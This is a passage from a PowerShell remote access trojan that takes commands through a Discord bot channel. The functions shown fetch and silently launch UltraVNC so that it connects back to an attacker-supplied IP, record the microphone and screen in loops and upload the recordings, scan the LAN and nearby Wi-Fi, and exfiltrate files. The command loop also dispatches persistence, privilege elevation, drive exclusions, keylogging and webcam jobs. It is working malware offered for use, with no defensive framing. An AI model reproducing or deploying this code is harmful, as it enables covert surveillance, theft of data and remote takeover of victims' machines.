        [string]$Path = "$env:Temp\downloaded_file"
    )
    $wc = New-Object System.Net.WebClient
    try {
        $wc.DownloadFile($Url, $Path)
        Send-DiscordMessage -Message ":white_check_mark: ``File downloaded to $Path`` :white_check_mark:"
    } catch {
        Send-DiscordMessage -Message ":x: ``Failed to download file from $Url`` :x:"
    }
}

function Start-Uvnc {
    param (
        [string]$Ip,
        [int]$Port = 5900
    )
    $url = "https://github.com/wormserv/assets/raw/main/uvnc.zip"
    $tempFolder = $env:Temp
    $zipFile = Join-Path -Path $tempFolder -ChildPath "uvnc.zip"
    $extractPath = Join-Path -Path $tempFolder -ChildPath "uvnc"
    Invoke-WebRequest -Uri $url -OutFile $zipFile
    Expand-Archive -Path $zipFile -DestinationPath $extractPath
    $vncPath = Join-Path -Path $extractPath -ChildPath "winvnc.exe"
    Start-Process -FilePath $vncPath -ArgumentList "-connect $Ip`:$Port" -WindowStyle Hidden
    Send-DiscordMessage -Message ":white_check_mark: ``UltraVNC started, connecting to $Ip`:$Port`` :white_check_mark:"
}

function Start-SpeechToText {
    Get-FFmpeg
    $outputFile = "$env:Temp\Audio.mp3"
    $transcriptFile = "$env:Temp\Transcript.txt"
    Add-Type '[Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IMMDevice {int a(); int o();int GetId([MarshalAs(UnmanagedType.LPWStr)] out string id);}[Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IMMDeviceEnumerator {int f();int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice endpoint);}[ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")] class MMDeviceEnumeratorComObject { }public static string GetDefault (int direction) {var enumerator = new MMDeviceEnumeratorComObject() as IMMDeviceEnumerator;IMMDevice dev = null;Marshal.ThrowExceptionForHR(enumerator.GetDefaultAudioEndpoint(direction, 1, out dev));string id = null;Marshal.ThrowExceptionForHR(dev.GetId(out id));return id;}' -Name audio -Namespace system
    function Get-FriendlyName($id) {
        $reg = "HKLM:\SYSTEM\CurrentControlSet\Enum\SWD\MMDEVAPI\$id"
        (Get-ItemProperty $reg).FriendlyName
    }
    $micId = [audio]::GetDefault(1)
    $micName = Get-FriendlyName $micId
    Send-DiscordMessage -Message ":microphone: ``Starting audio transcription...`` :microphone:"
    while ($true) {
        & "$env:Temp\ffmpeg.exe" -f dshow -i audio="$micName" -t 30 -c:a libmp3lame -ar 44100 -b:a 128k -ac 1 $outputFile
        $transcript = & "$env:Temp\ffmpeg.exe" -i $outputFile -f srt $transcriptFile 2>&1
        if (Test-Path $transcriptFile) {
            $text = Get-Content $transcriptFile -Raw
            Send-DiscordMessage -Message ":page_facing_up: ``Transcript: $text`` :page_facing_up:"
            Remove-Item -Path $transcriptFile -Force
        }
        Send-DiscordFile -FilePath $outputFile
        Remove-Item -Path $outputFile -Force
        Start-Sleep -Seconds 1
    }
}

function Start-EnumerateLAN {
    param ([string]$Prefix)
    if (-not $Prefix) {
        $localIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object SuffixOrigin -eq "Dhcp" | Select-Object -ExpandProperty IPAddress)
        $Prefix = $localIP -replace '\.\d+$', '.'
    }
    Send-DiscordMessage -Message ":globe_with_meridians: ``Scanning LAN with prefix $Prefix...`` :globe_with_meridians:"
    1..254 | ForEach-Object { Start-Process -WindowStyle Hidden ping.exe -ArgumentList "-n 1 -l 0 -f -i 2 -w 100 -4 $Prefix$_" }
    $computers = (arp.exe -a | Select-String "$Prefix.*dynam") -replace ' +',',' | ConvertFrom-Csv -Header Computername,IPv4,MAC | Where-Object { $_.MAC -ne 'dynamic' } | Select-Object IPv4, MAC, Computername
    $result = ""
    foreach ($comp in $computers) {
        try {
            $hostname = ([System.Net.Dns]::GetHostEntry($comp.IPv4)).HostName
            $result += "IP: $($comp.IPv4)`nMAC: $($comp.MAC)`nHostname: $hostname`n`n"
        } catch {
            $result += "IP: $($comp.IPv4)`nMAC: $($comp.MAC)`nHostname: N/A`n`n"
        }
    }
    Send-DiscordMessage -Message ":globe_with_meridians: ``LAN Scan Results:`n$result`` :globe_with_meridians:"
}

function Start-NearbyWifi {
    $wifi = (netsh wlan show networks mode=Bssid | Where-Object { $_ -match "SSID|Signal|Band" }).Trim() | Format-Table SSID, Signal, Band | Out-String
    Send-DiscordMessage -Message ":wifi: ``Nearby Wi-Fi Networks:`n$wifi`` :wifi:"
}

function Start-RecordScreen {
    param ([int]$Time = 60)
    Get-FFmpeg
    $outputFile = "$env:Temp\ScreenRecording.mp4"
    Send-DiscordMessage -Message ":camera: ``Recording screen for $Time seconds...`` :camera:"
    & "$env:Temp\ffmpeg.exe" -f gdigrab -t $Time -framerate 30 -i desktop -c:v libx264 -preset fast -crf 23 $outputFile
    Send-DiscordFile -FilePath $outputFile
    Remove-Item -Path $outputFile -Force
    Send-DiscordMessage -Message ":white_check_mark: ``Screen recording completed`` :white_check_mark:"
}

# Job Control Functions
function Stop-JobByName {
    param ([string]$JobName)
    $job = Get-Job -Name $JobName -ErrorAction SilentlyContinue
    if ($job) {
        Stop-Job -Name $JobName
        Remove-Job -Name $JobName
        Send-DiscordMessage -Message ":octagonal_sign: ``$JobName job stopped`` :octagonal_sign:"
    } else {
        Send-DiscordMessage -Message ":x: ``No job named $JobName found`` :x:"
    }
}

function Pause-Jobs {
    Get-Job | Where-Object { $_.State -eq 'Running' } | Suspend-Job
    Send-DiscordMessage -Message ":pause_button: ``All jobs paused`` :pause_button:"
}

function Resume-Jobs {
    Get-Job | Where-Object { $_.State -eq 'Suspended' } | Resume-Job
    Send-DiscordMessage -Message ":play_button: ``All jobs resumed`` :play_button:"
}

# Message Polling Function
function Pull-Messages {
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("Authorization", "Bot $global:Token")
    $messages = $wc.DownloadString("https://discord.com/api/v10/channels/$global:SessionID/messages") | ConvertFrom-Json
    $botId = ($wc.DownloadString("https://discord.com/api/v10/users/@me") | ConvertFrom-Json).id
    $recent = $messages | Where-Object { $_.author.id -ne $botId } | Select-Object -First 1
    return $recent.content
}

# Main Execution
if ($global:HideConsole) {
    Hide-Console
}

if ($global:CreateChannels) {
    try {
        New-DiscordChannelCategory
        New-DiscordChannel -Name "session"
        $global:SessionID = $global:ChannelID
        New-DiscordChannel -Name "loot"
        $global:LootID = $global:ChannelID
        New-DiscordChannel -Name "powershell"
        $global:PowershellID = $global:ChannelID
        New-DiscordChannel -Name "keys"
        $global:KeyID = $global:ChannelID
        New-DiscordChannel -Name "microphone"
        $global:MicrophoneID = $global:ChannelID
        New-DiscordChannel -Name "webcam"
        $global:WebcamID = $global:ChannelID
        New-DiscordChannel -Name "screenshots"
        $global:ScreenshotID = $global:ChannelID
    } catch {
        Send-DiscordMessage -Message ":x: ``Failed to create channels: $_.Exception.Message`` :x:"
    }
}

if ($global:InfoOnConnect) {
    try {
        Get-SystemInfo
    } catch {
        Send-DiscordMessage -Message ":x: ``Failed to get system info: $_.Exception.Message`` :x:"
    }
}

if ($global:AutoStartJobs) {
    try {
        Start-Job -Name "LootJob" -ScriptBlock $lootJob -ArgumentList $global:Token, $global:LootID
        Start-Job -Name "PowershellJob" -ScriptBlock $powershellJob -ArgumentList $global:Token, $global:PowershellID
        Start-Job -Name "KeyJob" -ScriptBlock $keyJob -ArgumentList $global:Token, $global:KeyID
        Start-Job -Name "AudioJob" -ScriptBlock $audioJob -ArgumentList $global:Token, $global:MicrophoneID, $null
        Start-Job -Name "WebcamJob" -ScriptBlock $webcamJob -ArgumentList $global:Token, $global:WebcamID
        Start-Job -Name "ScreenshotJob" -ScriptBlock $screenshotJob -ArgumentList $global:Token, $global:ScreenshotID
    } catch {
        Send-DiscordMessage -Message ":x: ``Failed to start jobs: $_.Exception.Message`` :x:"
    }
}

# Main Loop
$lastTimestamp = $null
while ($true) {
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", "Bot $global:Token")
        $messages = $wc.DownloadString("https://discord.com/api/v10/channels/$global:SessionID/messages") | ConvertFrom-Json
        $botId = ($wc.DownloadString("https://discord.com/api/v10/users/@me") | ConvertFrom-Json).id
        $recent = $messages | Where-Object { $_.author.id -ne $botId } | Select-Object -First 1
        if ($recent.timestamp -ne $lastTimestamp) {
            $lastTimestamp = $recent.timestamp
            $command = $recent.content.Trim()
            switch -Wildcard ($command) {
                "Options" { Show-Options }
                "ExtraInfo" { Show-ExtraInfo }
                "Cleanup" { Clear-System }
                "FakeUpdate" { Start-FakeUpdate }
                "Windows93" { Start-Windows93 }
                "WindowsIdiot" { Start-WindowsIdiot }
                "SendHydra" { Start-Hydra }
                "SoundSpam" { Start-SoundSpam }
                "MinimizeAll" { Minimize-All }
                "EnableDarkMode" { Enable-DarkMode }
                "DisableDarkMode" { Disable-DarkMode }
                "ShortcutBomb" { Start-ShortcutBomb }
                "AddPersistance" { Add-Persistence }
                "RemovePersistance" { Remove-Persistence }
                "IsAdmin" { Test-Admin }
                "Elevate" { Request-Elevation }
                "ExcludeCDrive" { Exclude-CDrive }
                "ExcludeAllDrives" { Exclude-AllDrives }
                "EnableIO" { Enable-IO }
                "DisableIO" { Disable-IO }
                "Exfiltrate*" {
                    $params = $command -split '\s+-'
                    $path = $null
                    $filetype = $null
                    foreach ($param in $params) {
                        if ($param -match '^Path\s+(.+)$') { $path = $matches[1] }
                        if ($param -match '^Filetype\s+(.+)$') { $filetype = $matches[1] }
                    }
                    Start-Exfiltrate -Path $path -Filetype $filetype
                }
                "Upload*" {
                    $params = $command -split '\s+-'
                    $path = $null
                    foreach ($param in $params) {
                        if ($param -match '^Path\s+(.+)$') { $path = $matches[1] }
                    }
                    Start-Upload -Path $path
                }
                "Download*" {
                    $params = $command -split '\s+-'
                    $url = $null
                    $path = "$env:Temp\downloaded_file"
                    foreach ($param in $params) {
                        if ($param -match '^Url\s+(.+)$') { $url = $matches[1] }
                        if ($param -match '^Path\s+(.+)$') { $path = $matches[1] }
                    }
                    if ($url) { Start-Download -Url $url -Path $path }
                    else { Send-DiscordMessage -Message ":x: ``Download requires -Url parameter`` :x:" }
                }
                "StartUvnc*" {
                    $params = $command -split '\s+-'
                    $ip = $null
                    $port = 5900
                    foreach ($param in $params) {
                        if ($param -match '^Ip\s+(.+)$') { $ip = $matches[1] }
                        if ($param -match '^Port\s+(.+)$') { $port = $matches[1] }
                    }
                    if ($ip) { Start-Uvnc -Ip $ip -Port $port }
                    else { Send-DiscordMessage -Message ":x: ``StartUvnc requires -Ip parameter`` :x:" }
                }
                "SpeechToText" { Start-SpeechToText }
                "EnumerateLAN*" {
                    $params = $command -split '\s+-'
                    $prefix = $null
                    foreach ($param in $params) {
                        if ($param -match '^Prefix\s+(.+)$') { $prefix = $matches[1] }
                    }
                    Start-EnumerateLAN -Prefix $prefix
                }
                "NearbyWifi" { Start-NearbyWifi }
                "RecordScreen*" {
                    $params = $command -split '\s+-'
                    $time = 60
                    foreach ($param in $params) {
                        if ($param -match '^t\s+(.+)$') { $time = $matches[1] }
                    }
                    Start-RecordScreen -Time $time
                }
                "Message *" { Send-Message -Message ($command -replace '^Message\s+', '') }
                "VoiceMessage *" { Send-VoiceMessage -Message ($command -replace '^VoiceMessage\s+', '') }
                "Wallpaper*" {
                    $params = $command -split '\s+-'
                    $url = $null
                    foreach ($param in $params) {
                        if ($param -match '^url\s+(.+)$') { $url = $matches[1] }
                    }
                    if ($url) { Set-Wallpaper -Url $url }
                    else { Send-DiscordMessage -Message ":x: ``Wallpaper requires -url parameter`` :x:" }
                }
                "Goose" { Start-Goose }
                "ScreenParty" { Start-ScreenParty }
                "Kill *" {
                    $jobName = $command -replace '^Kill\s+', ''
                    Stop-JobByName -JobName $jobName
                }
                "PauseJobs" { Pause-Jobs }
                "ResumeJobs" { Resume-Jobs }
                "Close" {
                    Send-DiscordMessage -Message ":octagonal_sign: ``Closing session for $env:COMPUTERNAME`` :octagonal_sign:"
                    Get-Job | Stop-Job
                    Get-Job | Remove-Job
                    exit
                }
                default {
                    Send-DiscordMessage -Message ":x: ``Unknown command: $command`` :x:"
                }
            }
        }
    } catch {
        Send-DiscordMessage -Message ":x: ``Error in main loop: $_.Exception.Message`` :x:"
        Send-ErrorReport -ErrorMessage "Main Loop Error: $_.Exception.Message`nStack Trace: $_.ScriptStackTrace"
    }
    Start-Sleep -Seconds 3
}
